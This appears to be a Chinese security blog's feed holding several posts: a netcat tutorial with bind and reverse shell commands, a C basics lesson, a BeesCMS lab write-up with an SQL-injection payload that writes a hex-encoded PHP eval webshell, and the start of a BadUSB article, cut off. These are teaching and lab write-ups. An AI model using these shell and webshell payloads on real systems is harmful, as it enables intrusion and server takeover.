plain"><table><tr><td class="code"><pre><span class="line">Options taking a time assume seconds. Append &#39;ms&#39; for milliseconds,  </span><br><span class="line">花费一段时间的选项假定为秒。附加毫秒数，  </span><br><span class="line">&#39;s&#39; for seconds, &#39;m&#39; for minutes, or &#39;h&#39; for hours (e.g. 500ms).  </span><br><span class="line">“s”表示秒，“m”表示分钟，或“h”表示小时（例如500毫秒）。  </span><br><span class="line">-4                             Use IPv4 only  </span><br><span class="line">-4仅使用IPv4  </span><br><span class="line">-6                         Use IPv6 only  </span><br><span class="line">-6仅使用IPv6  </span><br><span class="line">-U, --unixsock             Use Unix domain sockets only  </span><br><span class="line">-U、 --unixsock仅使用Unix域套接字  </span><br><span class="line">-C, --crlf                 Use CRLF for EOL sequence  </span><br><span class="line">-C、 --crlf使用crlf进行下线顺序   </span><br><span class="line">-c, --sh-exec &lt;command&gt;    Executes the given command via &#x2F;bin&#x2F;sh  </span><br><span class="line">-c、 --sh exec&lt;command&gt;通过&#x2F;bin&#x2F;sh执行给定的命令  </span><br><span class="line">-e, --exec &lt;command&gt;       Executes the given command  </span><br><span class="line">-e、 --exec&lt;command&gt;执行给定的命令  </span><br><span class="line">--lua-exec &lt;filename&gt;  Executes the given Lua script   </span><br><span class="line">--lua exec&lt;filename&gt;执行给定的lua脚本   </span><br><span class="line">-g hop1[,hop2,...]         Loose source routing hop points (8 max)   </span><br><span class="line">-g hop1[，hop2，…]松散源路由跃点（最多8个）   </span><br><span class="line">-G &lt;n&gt;                     Loose source routing hop pointer (4, 8, 12, ...)   </span><br><span class="line">-G&lt;n&gt;松散源路由跃点指针（4，8，12，…）   </span><br><span class="line">-m, --max-conns &lt;n&gt;        Maximum &lt;n&gt; simultaneous connections   </span><br><span class="line">-m、 --最大连接数&lt;n&gt;最大值&lt;n&gt;同时连接数  </span><br><span class="line">-h, --help                 Display this help screen   </span><br><span class="line">-h、 --帮助显示此帮助屏幕   </span><br><span class="line">-d, --delay &lt;time&gt;         Wait between read&#x2F;writes   </span><br><span class="line">-d、 --读&#x2F;写之间的延迟&lt;时间&gt;等待  </span><br><span class="line">-o, --output &lt;filename&gt;    Dump session data to a file   </span><br><span class="line">-o、 --输出&lt;filename&gt;将会话数据转储到文件  </span><br><span class="line">-x, --hex-dump &lt;filename&gt;  Dump session data as hex to a file  </span><br><span class="line">-x、 --十六进制转储&lt;filename&gt;将会话数据以十六进制形式转储到文件中  </span><br><span class="line">-i, --idle-timeout &lt;time&gt;  Idle read&#x2F;write timeout  </span><br><span class="line">-i、 --空闲超时&lt;时间&gt;空闲读&#x2F;写超时   </span><br><span class="line">-p, --source-port port     Specify source port to use   </span><br><span class="line">-p、 --源端口端口指定要使用的源端口  </span><br><span class="line">-s, --source addr          Specify source address to use (doesn&#39;t affect -l)  </span><br><span class="line">-s、 --source addr指定要使用的源地址（不影响-l）  </span><br><span class="line">-l, --listen               Bind and listen for incoming connections   </span><br><span class="line">-l、 --侦听绑定并侦听传入的连接  </span><br><span class="line">-k, --keep-open            Accept multiple connections in listen mode  </span><br><span class="line">-k、 --保持多个侦听连接处于打开状态   </span><br><span class="line">-n, --nodns                Do not resolve hostnames via DNS  </span><br><span class="line">-n、 --nodns不通过DNS解析主机名   </span><br><span class="line">-t, --telnet               Answer Telnet negotiations  </span><br><span class="line">-t、 ——telnet回答telnet协商   </span><br><span class="line">-u, --udp                  Use UDP instead of default TCP   </span><br><span class="line">-u、 --udp使用udp而不是默认TCP  </span><br><span class="line">--sctp                 Use SCTP instead of default TCP  </span><br><span class="line">--sctp使用sctp而不是默认TCP  </span><br><span class="line">-v, --verbose              Set verbosity level (can be used several times)  </span><br><span class="line">-v、 --详细设置详细级别（可多次使用）  </span><br><span class="line">-w, --wait &lt;time&gt;          Connect timeout   </span><br><span class="line">-w、 --等待&lt;时间&gt;连接超时   </span><br><span class="line">-z                         Zero-I&#x2F;O mode, report connection status only  </span><br><span class="line">-z零I&#x2F;O模式，仅报告连接状态  </span><br><span class="line">--append-output        Append rather than clobber specified output files   </span><br><span class="line">--追加输出追加而不是删除指定的输出文件</span><br><span class="line">--send-only            Only send data, ignoring received; quit on EOF    </span><br><span class="line">--仅发送仅发送数据，忽略接收到的数据；退出EOF   </span><br><span class="line">--recv-only            Only receive data, never send anything   </span><br><span class="line">--只接收数据，从不发送任何信息  </span><br><span class="line">--allow                Allow only given hosts to connect to Ncat  </span><br><span class="line">--允许仅允许给定主机连接到Ncat  </span><br><span class="line">--allowfile            A file of hosts allowed to connect to Ncat   </span><br><span class="line">--allowfile允许连接到Ncat的主机文件  </span><br><span class="line">--deny                 Deny given hosts from connecting to Ncat  </span><br><span class="line">--拒绝拒绝给定主机连接到Ncat  </span><br><span class="line">--denyfile             A file of hosts denied from connecting to Ncat  </span><br><span class="line">--拒绝连接到Ncat的主机文件  </span><br><span class="line">--broker               Enable Ncat&#39;s connection brokering mode  </span><br><span class="line">--代理启用Ncat的连接代理模式   </span><br><span class="line">--chat                 Start a simple Ncat chat server   </span><br><span class="line">--聊天启动一个简单的Ncat聊天服务器  </span><br><span class="line">--proxy &lt;addr[:port]&gt;  Specify address of host to proxy through  </span><br><span class="line">--proxy指定要代理的主机的地址  </span><br><span class="line">--proxy-type &lt;type&gt;    Specify proxy type (&quot;http&quot; or &quot;socks4&quot; or &quot;socks5&quot;)   </span><br><span class="line">--proxy type&lt;type&gt;指定代理类型（“http”或“socks4”或“socks5”）  </span><br><span class="line">--proxy-auth &lt;auth&gt;    Authenticate with HTTP or SOCKS proxy server  </span><br><span class="line">--proxy auth&lt;auth&gt;通过HTTP或SOCKS代理服务器进行身份验证  </span><br><span class="line">--ssl                  Connect or listen with SSL   </span><br><span class="line">--ssl使用ssl连接或侦听   </span><br><span class="line">--ssl-cert             Specify SSL certificate file (PEM) for listening  </span><br><span class="line">--ssl证书指定用于侦听的ssl证书文件（PEM）  </span><br><span class="line">--ssl-key              Specify SSL private key (PEM) for listening  </span><br><span class="line">--ssl密钥指定用于侦听的ssl私钥（PEM）  </span><br><span class="line">--ssl-verify           Verify trust and domain name of certificates  </span><br><span class="line">--ssl verify验证证书的信任和域名   </span><br><span class="line">--ssl-trustfile        PEM file containing trusted SSL certificates    </span><br><span class="line">--ssl trustfile包含可信ssl证书的PEM文件   </span><br><span class="line">--ssl-ciphers          Cipherlist containing SSL ciphers to use  </span><br><span class="line">--ssl密码包含要使用的ssl密码的密码列表  </span><br><span class="line">--ssl-alpn             ALPN protocol list to use.   </span><br><span class="line">--要使用的ssl alpn alpn协议列表。   </span><br><span class="line">--version              Display Ncat&#39;s version information and exit  </span><br><span class="line">--版本显示Ncat的版本信息并退出   </span><br><span class="line">See the ncat(1) manpage for full options, descriptions and usage examples   </span><br><span class="line">有关完整的选项、描述和使用示例，请参见ncat（1）手册页  </span><br></pre></td></tr></table></figure><p>其实常用的就几个参数-n,-v,-l,-p,-q<br>我们跟着例子慢慢来熟悉这一强大的工具~  </p><h2 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3.使用场景"></a>3.使用场景</h2><p>了解完我们的netcat可以做的事之后，我们就可以开始来上手我们的netcat了，首先我们可以先来看看几个例子</p><h4 id="注意！"><a href="#注意！" class="headerlink" title="注意！"></a>注意！</h4><p>文章中所有参数都没有简写，为了更好的说明原理<br>而在实际操作中我们可以把两个参数连接到一起<br>例如 : -l -p 等价于 -lp </p><h3 id="1-Scan——端口扫描"><a href="#1-Scan——端口扫描" class="headerlink" title="1.Scan——端口扫描"></a>1.Scan——端口扫描</h3><p>Netcat可以作为我们在渗透前信息收集的一款工具，它可以用来做端口扫描，具体使用场景如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -z -v -n xxx.xxx.xxx.xxx 端口起始-端口结束  </span><br><span class="line">nc -z -v -n 192.168.31.120 1-100</span><br><span class="line">nc -zvn 192.168.31.120 1-65535</span><br></pre></td></tr></table></figure><p>默认为tcp模式使用-u参数可为udp模式<br>-z参数为使用零IO模式,连接成功后立即关闭连接,不进行数据交换，不留下痕迹<br>-v参数是详细输出的意思<br>-n参数为不使用DNS反向查询IP地址的域名，可加快速度<br>端口起始-端口结束参数会扫描这一个范围的端口<br><img src="https://i.loli.net/2020/11/21/spFgRldT5Sz98cx.png" alt="QQ截图20201121231705.png"><br>即可扫描出开放端口</p><h3 id="2-Chat——聊天服务器"><a href="#2-Chat——聊天服务器" class="headerlink" title="2.Chat——聊天服务器"></a>2.Chat——聊天服务器</h3><p>Netcat也可以传输单纯的字符,或文件，在取证时也很有用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A sever : nc -l -p 1888</span><br><span class="line">B sever : nc A&#39;s IP 1888</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/21/ntXPIqJmUGrRVKL.png" alt="QQ截图20201121233523.png"><br><img src="https://i.loli.net/2020/11/21/eo3I4QSqHAh89GZ.jpg" alt="qq_pic_merged_1605972954674.jpg"><br>-l参数为侦听绑定并侦听传入的连接(listen)<br>-p参数为指定端口(port)<br>所以我们只需要在一个机器上设置好监听，另一个机器再连接即可<br>Netcat会启动一个tcp服务器，所有的标准输出和输入会输出到该端口(1888)。输出和输入都在此shell中展示。   </p><h3 id="3-文件传输"><a href="#3-文件传输" class="headerlink" title="3.文件传输"></a>3.文件传输</h3><p>在我们要传输一些文件，又不想安装其他软件时，小巧的Netcat就可以帮我们实现文件传输<br>同时，如果你想加密传输的流，我们可以使用mcrypt工具加密  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A sever : nc -l -p 1888 &gt; output.txt</span><br><span class="line">B sever : nc A&#39;s IP 1888 &lt; input.txt</span><br></pre></td></tr></table></figure><p>如图，已经实现我们传输文件的要求<br><img src="https://i.loli.net/2020/11/21/uM4jfUA9Hc1zP8l.png" alt="QQ截图20201121235534.png"><br>那么我们如果要传输文件夹或者zip怎么办呢?<br>我们一样可以使用Netcat  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A sever : tar -cvf – dir_name | nc -l -p 1888</span><br><span class="line">B sever : nc -n A&#39;s IP  1888 | tar -xvf </span><br></pre></td></tr></table></figure><p>使用如上命令即可<br>如果要加密传输也一样  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A sever : nc localhost 1888 | mcrypt –flush –bare -F -q -d -m ecb &gt; input.txt</span><br><span class="line">B sever : mcrypt –flush –bare -F -q -m ecb &lt; output.txt | nc -l -p 1888 </span><br></pre></td></tr></table></figure><h3 id="4-挂载磁盘"><a href="#4-挂载磁盘" class="headerlink" title="4.挂载磁盘"></a>4.挂载磁盘</h3><p>在你想远程访问另一台设备的磁盘时,Netcat没想到居然也能帮你完成  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A sever : nc -l -p 1888 |dd of&#x3D;&#x2F;dev&#x2F;sda</span><br><span class="line">B sever : dd if&#x3D;&#x2F;dev&#x2F;sda | nc -nc A&#39;s ip 1888 </span><br></pre></td></tr></table></figure><h3 id="5-Shell——获取Shell"><a href="#5-Shell——获取Shell" class="headerlink" title="5.*Shell——获取Shell"></a>5.*Shell——获取Shell</h3><p>在我们的渗透测试中，以上几种用法可能都不是我们最需要的，但用Nc获取shell，你不能不会！</p><h4 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h4><p>原理图如下<br><img src="https://i.loli.net/2020/11/22/nAYHp4uUtvf9iKV.png" alt="QQ截图20201122001410.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A Sever : nc -l -p 1888 -c bash</span><br><span class="line">B Sever : nc A&#39;s IP 1888</span><br></pre></td></tr></table></figure><p>-c参数为通过/bin/sh执行给定的命令在windows下bash要替换为cmd<br>如图，在电脑上可以直接获取我手机上termux的shell<br><img src="https://i.loli.net/2020/11/22/hHr2RoFWmqE7QOM.jpg" alt="qq_pic_merged_1605976000013.jpg"><br><img src="https://i.loli.net/2020/11/22/VGvM9oJwSDYHbt5.png" alt="QQ截图20201122002609.png"></p><h4 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2. 反向连接"></a>2. 反向连接</h4><p>原理图如下<br><img src="https://i.loli.net/2020/11/22/8IFQU5OmBYaNcSs.png" alt="QQ截图20201122001520.png"><br>在实战中因为firewall等问题，反向连接对于我们来说更为常用  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A Sever : nc -l -p 1888</span><br><span class="line">B Sever : nc A&#39;s IP 1888 -c bash</span><br></pre></td></tr></table></figure><p>如图，在手机上可以控制电脑上的shell<br><img src="https://i.loli.net/2020/11/22/VXlH46w9aGKI3AC.png" alt="QQ截图20201122003334.png"><br><img src="https://i.loli.net/2020/11/22/YLlAI1HiOg7Scmt.jpg" alt="qq_pic_merged_1605976429649.jpg">  </p><h2 id="4-结尾"><a href="#4-结尾" class="headerlink" title="4.结尾"></a>4.结尾</h2><p>其实Netcat能做的事远不止这些，这篇文章仅用来做个基础的用法介绍，后面更多好用的用法与渗透的思路我都会慢慢分享，感谢各位师傅的支持，在最近我也会更新有关Termux或者PE制作WTG系统制作之类的教程，如果喜欢的话就分享打赏吧~</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 网络工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> Netcat </tag>
            
            <tag> 红蓝攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回归！</title>
      <link href="2020/11/08/%E5%9B%9E%E5%BD%92%EF%BC%81/"/>
      <url>2020/11/08/%E5%9B%9E%E5%BD%92%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="嘿！好久不见"><a href="#嘿！好久不见" class="headerlink" title="嘿！好久不见"></a>嘿！好久不见</h1><h2 id="一不小心就咕咕咕了4个月，实在抱歉"><a href="#一不小心就咕咕咕了4个月，实在抱歉" class="headerlink" title="一不小心就咕咕咕了4个月，实在抱歉"></a>一不小心就咕咕咕了4个月，实在抱歉</h2><h3 id="不过，这次更新我的blog也大变样啦"><a href="#不过，这次更新我的blog也大变样啦" class="headerlink" title="不过，这次更新我的blog也大变样啦"></a>不过，这次更新我的blog也大变样啦</h3><ol><li>主题由Next更换为butterfly</li><li>访问速度的提升</li><li>更人性化设计的各种小细节<br>高亮显示:<br>C语言里的函数 <code>scanf()</code> 怎么使用？<br>代码块事例:  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">是不是比原来的好看~</span><br><span class="line">之后所有的代码都将替换成这种好看的样子哦~</span><br></pre></td></tr></table></figure></li><li>即将支持emoji等多元化文字</li><li>即将开放评论功能</li><li>即将开放图集等额外功能</li><li>启用搜索功能<h3 id="总之，敬请期待吧"><a href="#总之，敬请期待吧" class="headerlink" title="总之，敬请期待吧~"></a>总之，敬请期待吧~</h3><h2 id="我，回来啦"><a href="#我，回来啦" class="headerlink" title="我，回来啦~"></a>我，回来啦~</h2></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言变量与常量</title>
      <link href="2020/11/08/C%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/"/>
      <url>2020/11/08/C%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="C语言变量与常量"><a href="#C语言变量与常量" class="headerlink" title="C语言变量与常量"></a>C语言变量与常量</h2><h3 id="变量：在c语言中变量就是能够改变的量"><a href="#变量：在c语言中变量就是能够改变的量" class="headerlink" title="变量：在c语言中变量就是能够改变的量"></a>变量：在c语言中变量就是能够改变的量</h3><h3 id="常量：就是在定义后不能去改变的值就是常量"><a href="#常量：就是在定义后不能去改变的值就是常量" class="headerlink" title="常量：就是在定义后不能去改变的值就是常量"></a>常量：就是在定义后不能去改变的值就是常量</h3><p>变量包括了char,int ,double,float,long,long long,short类型<br>常量使用前需要先定义<br>#define又称宏定义，标识符为所定义的宏名，简称宏。标识符的命名规则与前面讲的变量的命名  规则是一样的。<br>#define 的功能是将标识符定义为其后的常量。一经定义，程序中就可以直接用标识符来表示这个  常量。是不是与定义变量类似？但是要区分开！<br>变量名表示的是一个变量，但宏名表示的是一个常量。可以给变量赋值，但绝不能给常量赋值。<br>为了将标识符与变量名区别开来，习惯上标识符全部用大写字母表示。  </p><h3 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h3><p>#difine NUM 100//这是宏定义（是常量不可被赋值）<br> #undef NUM（可以用#undef来终止宏定义，NUM这个标识符在下面的程序中将不会生效）<br>int a<br>a=100//这是定义变量可以在之后的程序中再赋值  </p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeesCMS系统漏洞分析溯源WP</title>
      <link href="2020/11/08/BeesCMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90WP/"/>
      <url>2020/11/08/BeesCMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90WP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BeesCMS系统漏洞分析溯源WP"><a href="#BeesCMS系统漏洞分析溯源WP" class="headerlink" title="BeesCMS系统漏洞分析溯源WP"></a>BeesCMS系统漏洞分析溯源WP</h1><h3 id="本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991"><a href="#本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991" class="headerlink" title="本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991"></a>本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991</h3><h3 id="作者博客JoCatW-github-io"><a href="#作者博客JoCatW-github-io" class="headerlink" title="作者博客JoCatW.github.io"></a>作者博客JoCatW.github.io</h3><p>背景介绍<br>某人搭建BeesCMS网站，邀请“墨者”安全工程师测试网站的安全性。<br>实训目标  </p><p>1、了解BeesCMS；<br>2、了解此漏洞形成的原因；<br>3、掌握此漏洞的利用方式；  </p><p>解题方向<br>根据网站目录，找到利用漏洞。<br>提示：网站位于”/var/www/html/“目录下。</p><p>链接:<a href="https://www.mozhe.cn/bug/detail/N3FvbjdsQUkza2F4b1hORGNXRVk1UT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/N3FvbjdsQUkza2F4b1hORGNXRVk1UT09bW96aGUmozhe</a><br><img src="https://i.loli.net/2020/04/19/w16x8YDkLmJMQZ5.png" alt="QQ截图20200419180505.png"><br>先进入环境看看<br><img src="https://i.loli.net/2020/04/19/VuiN6ZhIvYa1z7F.png" alt="QQ截图20200419180639.png"><br>随便点进去一个页面<br><img src="https://i.loli.net/2020/04/19/MavJdVk29lQcuWX.png" alt="QQ截图20200419180713.png"><br>发现有参数，尝试SQL注入，无果<br><img src="https://i.loli.net/2020/04/19/4WbHFe2NDxPGgAB.png" alt="QQ截图20200419180723.png"><br><img src="https://i.loli.net/2020/04/19/eFEjLduZoMINxSs.png" alt="QQ截图20200419180812.png"><br>于是御剑扫描了下目录，发现有admin目录<br><img src="https://i.loli.net/2020/04/19/IT65zb32WNMAB9Q.png" alt="QQ截图20200419181041.png"><br><img src="https://i.loli.net/2020/04/19/D92OQLSVTMRnokj.png" alt="QQ截图20200419181053.png"><br>点进去测试了下弱口令，结果直接就试出来账号admin密码admin….<br>进入后台寻找一番，尝试上传木马，结果不行<br><img src="https://i.loli.net/2020/04/19/7O89WPpiInbEaLd.png" alt="QQ截图20200419182053.png"><br>查了下相关漏洞，恍然大悟~<br>登陆界面存在SQL注入,在admin后加’测试，发现页面报错<br><img src="https://i.loli.net/2020/04/19/KeXxGiQkvUMHl7w.png" alt="QQ截图20200419181226.png"><br><img src="https://i.loli.net/2020/04/19/JdnCm53kpT2H9he.png" alt="QQ截图20200419181239.png"><br>那就打开BP准备上传木马~<br><img src="https://i.loli.net/2020/04/19/roTUC9BRFA2f3Px.png" alt="QQ截图20200419181439.png"><br><img src="https://i.loli.net/2020/04/19/sCq4AuKjfWge82D.png" alt="QQ截图20200419181544.png"><br>经过了解，我们发现user参数存在注入，于是开始尝试注入，这里我就直接放出来最后的语句了，因为不断测试过滤语句有点冗长~<br>具体分析可以看这篇文章<br><a href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a><br>我们的payload如下<br>admin%27 un union ion selselectect 1,2,3,4,<?php @eval($_POST[cmd]);?> into  outfile ‘/var/www/html’#<br>这边的写入地址在我们的题目简介里就已经给我们了<br>所以我们直接写入，结果发现并没有写入成功。<br><img src="https://i.loli.net/2020/04/19/Bk7jOxGY9EC12qR.png" alt="QQ截图20200419182402.png"><br>经过抓包BP排查，发现php函数htmlspecialchars()对输入中含有的特殊符号进行html实体化转义,导致不能写shell到目标服务器上。可以通过利用mysql注入的一个特性就可以达到注入效果(即对shell部分进行Hex编码),或者用mysql函数char()就可以绕过这里的限制。所以我们只需要对于我们的shell进行Hex编码。<br>所以最后<br>写入shell的payload为:admin’ uni union on selselectect null,null,null,null,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e  in into  outoutfilefile ‘/var/www/html’#<br><img src="https://i.loli.net/2020/04/19/iUW3ZT8tJqOose5.png" alt="QQ截图20200419182626.png"><br>成功写入~<br>接下来用蚁剑连上即可<br><img src="https://i.loli.net/2020/04/19/FCogJrkERWwNSUs.png" alt="QQ截图20200419182652.png"><br><img src="https://i.loli.net/2020/04/19/RKvapDJ93WwYiNB.png" alt="QQ截图20200419182703.png"><br>这里经过查找发现flag在根目录<br><img src="https://i.loli.net/2020/04/19/rh97JSbEpWFGx15.png" alt="QQ截图20200419182714.png"><br><img src="https://i.loli.net/2020/04/19/QungLzWHC31f87a.png" alt="QQ截图20200419182721.png"><br>这样就完成啦，这题主要的思路就是要了解BeesCMS的相关漏洞，并结合题目中给的地址进行木马上传，当然这里的写入地址也可以通过在管理页面上传报错后查看出来~<br>喜欢的师傅们收藏下网站啦，今后会一直更新各种教程~</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> 墨者学院 </category>
          
          <category> CMS漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 墨者学院WP </tag>
            
            <tag> CMS漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb第一期</title>
      <link href="2020/11/08/badusb%E7%AC%AC%E4%B8%80%E6%9C%9F/"/>
      <url>2020/11/08/badusb%E7%AC%AC%E4%B8%80%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法"><a href="#HID攻击之Badusb-全面的带你了解Badusb五种的花样玩法" class="headerlink" title="HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)"></a>HID攻击之Badusb(全面的带你了解Badusb五种的花样玩法.)</h1><h3 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-x43-97-x74-87-x46-89-x40-x31-54-x33-46-99-x6f-x6d"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-x6f-x43-97-x74-87-x46-89-x40-x31-54-x33-46-99-x6f-x6d" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;">&#x4a;&#x6f;&#x43;&#97;&#x74;&#87;&#x46;&#89;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#x6d;</a></h3><h3 id="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"><a href="#本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点"></a>本文可能存在攻击性，请勿用于非法用途。仅用于技术交流，一切责任与本人无关，如有不足的地方希望指点</h3><h3 id="作者博客JoCatW-github-io"><a href="#作者博客JoCatW-github-io" class="headerlink" title="作者博客JoCatW.github.io"></a>作者博客JoCatW.github.io</h3><h1 id="00x0-什么是Badusb"><a href="#00x0-什么是Badusb" class="headerlink" title="00x0 什么是Badusb?"></a>00x0 什么是Badusb?</h1><ul><li>你可能见过这种<br><img src="https://i.loli.net/2020/03/08/f8kHwWxSIZy2lEY.jpg" alt="timg1.jpg">  </li><li>或者这种<br><img src="https://i.loli.net/2020/03/08/kDor4jlLBqyG5Et.jpg" alt="u_1928801367,4272028566_fm_26_gp_0.jpg">  </li><li>还有下面这种<br><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3817482061,835766297&fm=26&gp=0.jpg" alt="badusb照片"><br>这些都是Badusb。<h2 id="badusb的起源"><a href="#badusb的起源" class="headerlink" title="badusb的起源"></a>badusb的起源</h2><h2 id="BadUSB最早是在2014年的BlackHat安全会议上由研究人员JakobLell和Karsten-Nohl提出并展示的。不同于其他的U盘病毒，它利用HID协议无需安装驱动就能进行交互的功能，通过模拟键盘、鼠标、网卡等设备，最终拿下Shell或者窃取敏感信息等。"><a href="#BadUSB最早是在2014年的BlackHat安全会议上由研究人员JakobLell和Karsten-Nohl提出并展示的。不同于其他的U盘病毒，它利用HID协议无需安装驱动就能进行交互的功能，通过模拟键盘、鼠标、网卡等设备，最终拿下Shell或者窃取敏感信息等。" class="headerlink" title="BadUSB最早是在2014年的BlackHat安全会议上由研究人员JakobLell和Karsten Nohl提出并展示的。不同于其他的U盘病毒，它利用HID协议无需安装驱动就能进行交互的功能，通过模拟键盘、鼠标、网卡等设备，最终拿下Shell或者窃取敏感信息等。"></a>BadUSB最早是在2014年的BlackHat安全会议上由研究人员JakobLell和Karsten Nohl提出并展示的。不同于其他的U盘病毒，它利用HID协议无需安装驱动就能进行交互的功能，通过模拟键盘、鼠标、网卡等设备，最终拿下Shell或者窃取敏感信息等。</h2><h1 id="00x1什么是HID？"><a href="#00x1什么是HID？" class="headerlink" title="00x1什么是HID？"></a>00x1什么是HID？</h1><h2 id="HID（Human-InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。也就是说，这种攻击是通过模拟键盘和鼠标等计算机与人进行交互的硬件去发动攻击的-在模拟成为键盘后控制电脑执行内置语句-那么理论上来讲就没有可以破解这种攻击是杀毒软件，不过360是有这方面的防护的，比如变形虫，但是经实测360的变形虫并不能特别有效防御我们基于teensy的badusb，当防护功能检测到USB设备的可疑行为时，会通过弹窗对用户进行提醒，用户可根据情况自行决定信任USB设备或拦截可疑行为。某种意义上这也算防御"><a href="#HID（Human-InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。也就是说，这种攻击是通过模拟键盘和鼠标等计算机与人进行交互的硬件去发动攻击的-在模拟成为键盘后控制电脑执行内置语句-那么理论上来讲就没有可以破解这种攻击是杀毒软件，不过360是有这方面的防护的，比如变形虫，但是经实测360的变形虫并不能特别有效防御我们基于teensy的badusb，当防护功能检测到USB设备的可疑行为时，会通过弹窗对用户进行提醒，用户可根据情况自行决定信任USB设备或拦截可疑行为。某种意义上这也算防御" class="headerlink" title="HID（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。也就是说，这种攻击是通过模拟键盘和鼠标等计算机与人进行交互的硬件去发动攻击的.在模拟成为键盘后控制电脑执行内置语句.那么理论上来讲就没有可以破解这种攻击是杀毒软件，不过360是有这方面的防护的，比如变形虫，但是经实测360的变形虫并不能特别有效防御我们基于teensy的badusb，当防护功能检测到USB设备的可疑行为时，会通过弹窗对用户进行提醒，用户可根据情况自行决定信任USB设备或拦截可疑行为。某种意义上这也算防御."></a>HID（Human 